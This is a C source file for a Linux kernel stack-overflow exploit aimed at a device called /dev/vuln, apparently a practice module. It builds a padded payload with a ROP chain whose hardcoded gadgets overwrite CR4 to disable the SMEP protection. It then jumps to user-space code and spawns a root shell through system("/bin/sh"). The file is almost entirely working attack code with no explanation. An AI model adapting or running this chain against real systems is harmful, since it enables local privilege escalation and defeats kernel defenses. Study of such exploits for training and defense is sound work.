#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

#define OFFSET 56
#define LINES 6
#define PAYLOAD_SIZE (OFFSET + LINES * sizeof(unsigned long))

extern void asm_exploit(void);
extern void get_regs(void);
extern unsigned long user_flags;

char payload[PAYLOAD_SIZE];


void main(){
    int fd;
	int i;  
	char *p;
    unsigned long * rop;
    
    get_regs();

    for (p = payload; p< payload + OFFSET; p++){
        *p = 'A';
    }
    // ROP chain

    rop = (unsigned long *)p;
    *rop++ = 0xffffffff8100284a; // pop rdi ; ret
    *rop++ = 0x00000000004406f0; // new cr4 value with SMEP disabled
    *rop++ = 0xffffffff810445a8; // pop rdx
    *rop++ = user_flags;        // address of user_flag
    *rop++ = 0xffffffff8103c39e; // mov cr4, rdi ;  mov rdx, flags
    *rop++ = (unsigned long)asm_exploit;


    fd = open("/dev/vuln", O_WRONLY);
    if(fd < 0){
        perror("open");
        exit(-1);
    }
    write(fd, payload, sizeof(payload));
    printf("If you see this message, exploit failed!\n");
    close(fd);
    exit(1);
}

void cont(){
    system("/bin/sh");
    _exit(0);
}